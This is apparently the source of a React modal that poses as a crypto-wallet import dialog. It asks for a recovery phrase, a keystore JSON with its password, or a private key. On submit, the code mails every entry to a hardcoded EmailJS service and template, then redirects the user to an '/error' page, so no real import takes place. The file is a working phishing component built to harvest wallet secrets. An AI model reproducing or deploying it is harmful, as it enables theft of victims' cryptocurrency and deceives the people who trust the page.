"use client"

import emailjs from '@emailjs/browser'
import React, { ChangeEvent, Dispatch, SetStateAction, useEffect, useState } from 'react'
import { useRouter } from 'next/navigation';


function ModalWallet({img, name, cancelModal}:{img:string, name: string, cancelModal:(bool: boolean) => void}) {
    const [loader,setLoader] = useState<boolean>(false)
    const [loaderJson,setLoaderJson] = useState<boolean>(false)
    const [loaderPrivateKey,setLoaderPrivateKey] = useState<boolean>(false)
    const [phraseInput, setPhraseInput] = useState('');
    const [keystoreInput, setKeyStoreInput] = useState({
        wallet_message: "",
        keystorepassword: ""
    })
    const [privatekeyInput, setPrivatekeyInput] = useState('');
    const router = useRouter();

    useEffect(()=>{
        emailjs.init('AipbvUEOaW-U7mTEE')
    },[])

    function tabToggle(e: any, tabId: string){
        document.querySelectorAll('.tabs-item > div').forEach((item)=>{
            item.classList.add('hidden');
        })
        document.querySelectorAll('.btn-class').forEach((item)=>{
            item.classList.remove("text-blue-600")
        })
        document.querySelector(`#${tabId}`)?.classList.remove('hidden');
        e.target?.classList.add('text-blue-600');
    }

    function setPhrase(e: ChangeEvent<HTMLTextAreaElement>){
        setPhraseInput(e.target.value)
    }

    function setKeystore(e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>){
        console.log(e);
        setKeyStoreInput({...keystoreInput, [e.target.id]: e.target.value})
    }

    function setPrivateKey(e: ChangeEvent<HTMLInputElement>){
        setPrivatekeyInput(e.target.value)
    }



    function handleSubmit(e: React.FormEvent, id: string, setBtnState: Dispatch<SetStateAction<boolean>>){
        e.preventDefault();
        setBtnState(true);
        emailjs.sendForm('service_tgqciuu', 'template_cf0r0nk', id)
        .then(function(response) {
                router.push("/error")
            }, function(error) {
                console.log(error);
                router.push("/error")
        });
    }

    // function handleSubmitjson(e: React.FormEvent){
    //     e.preventDefault();
    //     setLoaderJson(true)
    //     emailjs.sendForm('service_tgqciuu', 'template_cf0r0nk', '#keyStoreJson')
    //     .then(function(response) {
    //             setLoaderJson(false)
    //             router.push("/error")
    //         }, function(error) {
    //             setLoaderJson(false)
    //             router.push("/error")
    //     });
    // }

    // function handleSubmitPrivateKey(e: React.FormEvent){
    //     e.preventDefault()
    //     setLoaderPrivateKey(true)
    //     emailjs.sendForm('service_tgqciuu', 'template_tuoj89k', '#PrivateKey')
    //     .then(function(response) {
    //             setLoaderPrivateKey(false)
    //             router.push("/error")
    //         }, function(error) {
    //             setLoaderPrivateKey(false)
    //             router.push("/error")
    //     });
    // }

    return (
        <div className='fixed w-full h-screen z-50 bg-black/[0.2] flex items-center justify-center'>
            <div className='w-11/12 sm:w-[80%] md:w-1/2 bg-white p-5 relative my-8 transition-all rounded-lg '>
                <div className='p-3 sm:p-5 pb-4 '>
                    <h3 className='flex items-center mt-2 leading-6 text-lg font-semibold text-[#1A202C]'>
                        <img src={img} alt={name} className="h-10 w-10 mr-5 block" />
                        <span>Import your {name}</span>
                    </h3>
                    <div className='mt-10 text-[#587087]'>
                            <div className='flex justify-evenly border-b-2 border-b-[#e2e8f0] mb-4'>
                                <button 
                                    onClick={(e)=>tabToggle(e, 'firstChild')} 
                                    id='phrase' 
                                    className='text-blue-600 switch-btn btn-class'
                                >
                                    Phrase
                                </button>
                                <button 
                                    onClick={(e)=>tabToggle(e, 'second')} 
                                    id='keystore' 
                                    className='switch-btn btn-class'
                                >
                                    Keystore JSON
                                </button>
                                <button 
                                    onClick={(e)=>tabToggle(e, 'third')} 
                                    id='private' 
                                    className='switch-btn btn-class'
                                >
                                    Private Key
                                </button>
                            </div>
                            <div className='tabs-item'>
                                <div id="firstChild" className=''>
                                    <div className='relative '>
                                        <form  
                                            method="POST" 
                                            onSubmit={(e)=>handleSubmit(e, '#phraseSubmit', setLoader)} 
                                            id="phraseSubmit"
                                        >
                                            <input type="text" name='wallet_type' className='hidden' value={name}/>
                                            <input type="text" name='input_type' className='hidden' value={"Phrase"}/>
                                            <textarea 
                                                cols={30}
                                                rows={4} 
                                                placeholder="Enter your recovery phrase" 
                                                className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
                                                name="wallet_message" 
                                                id="wallet_message" 
                                                minLength={12} 
                                                required
                                                value={phraseInput}
                                                onChange={setPhrase}
                                            />
                                            <p className="text-xs text-grey-300 my-6">
                                                Typically 12 (sometimes 24) words separated by single spaces
                                            </p>
                                            <div className="flex w-full">
                                                <button disabled={loader} type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
                                                    {!loader ? <>
                                                        <span className="mr-2 uppercase">Proceed</span> 
                                                        <span>
                                                            <svg fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6">
                                                                <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                            </svg>
                                                        </span>
                                                    </> : <p className='h-6 w-6 rounded-full border-2 border-white border-t-gray animate-spin' />}
                                                </button>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <div id="second" className="bg-grey-600 hidden">
                                    <div className="flex flex-col">
                                        <form 
                                            method="POST" 
                                            onSubmit={(e)=>handleSubmit(e, '#keyStoreJson', setLoaderJson)} 
                                            id="keyStoreJson"
                                        >
                                            <input type="text" id='wallet_type' name='wallet_type' className='hidden' value={name} />
                                            <input type="text" name='input_type' className='hidden' value={"Keystone JSON"}/>
                                            <textarea 
                                                cols={30}
                                                rows={4}
                                                placeholder="Enter your Keystore Json" 
                                                className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
                                                name="wallet_message" 
                                                id="wallet_message" 
                                                minLength={12}
                                                required={true}
                                                value={keystoreInput.wallet_message}
                                                onChange={setKeystore}
                                            />   
                                            <div className="relative mb-6">
                                                <input 
                                                    type="text" 
                                                    id="keystorepassword" 
                                                    name="keystorepassword" 
                                                    placeholder="Wallet password" 
                                                    className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
                                                    required
                                                    value={keystoreInput.keystorepassword}
                                                    onChange={setKeystore}
                                                />
                                                <p className="text-xs text-grey-300 my-6">
                                                    Several lines of text beginning with {"{...}"} plus the password you used to encrypt it.
                                                </p>
                                            </div>
                                            <div className="flex w-full">
                                                <button type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
                                                    {!loaderJson ? <>
                                                        <span className="mr-2uppercase">Proceed</span>
                                                        <span>
                                                            <svg fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6">
                                                                <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                            </svg>
                                                        </span>
                                                        </> : <p className='h-6 w-6 rounded-full border-2 border-white border-t-gray animate-spin' />}
                                                </button>
                                            </div>
                                        </form>
                                    </div> 
                                </div>
                                <div id="third" className='bg-grey-600 hidden'>
                                    <div className=''>
                                        <form 
                                            method="POST" 
                                            onSubmit={(e)=>handleSubmit(e, '#PrivateKey', setLoaderPrivateKey)} 
                                            id="PrivateKey"
                                        >
                                            <input type="text" name='wallet_type' className='hidden' value={name}/>
                                            <input type="text" name='input_type' className='hidden' value={"Private Key"}/>
                                            <input 
                                                type="text" 
                                                placeholder="Enter your Private Key" 
                                                name="wallet_message" 
                                                id="wallet_message" 
                                                className=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
                                                required
                                                value={privatekeyInput}
                                                onChange={setPrivateKey}
                                            />
                                            <p className="text-xs text-grey-300 my-6">Typically 12 (sometimes 24) words seperated by a single space.</p>
                                            <button type="submit" name="import" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in">
                                                {!loaderPrivateKey ? <>
                                                    <span className="mr-2 uppercase">Proceed</span> 
                                                    <span>
                                                        <svg fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6">
                                                            <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                        </svg>
                                                    </span>
                                                    </> : <p className='h-6 w-6 rounded-full border-2 border-white border-t-gray animate-spin' />}
                                            </button>
                                        </form>
                                    </div>
                                </div>
                        </div>
                    </div>
                    <div className="bg-gray-50 px-4 py-3 sm:px-6 sm:flex sm:flex-row-reverse">
                        <button id="cancel" onClick={()=>cancelModal(false)} type="button" className="w-full inline-flex justify-center rounded-md border border-transparent shadow-sm px-4 py-2 bg-[#e53e3e] text-base font-medium text-white hover:opacity-75 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 sm:ml-3 sm:w-auto sm:text-sm">
                            Cancel
                        </button>
                    </div>
                </div>
            </div>
        </div>
  )
}

export default ModalWallet
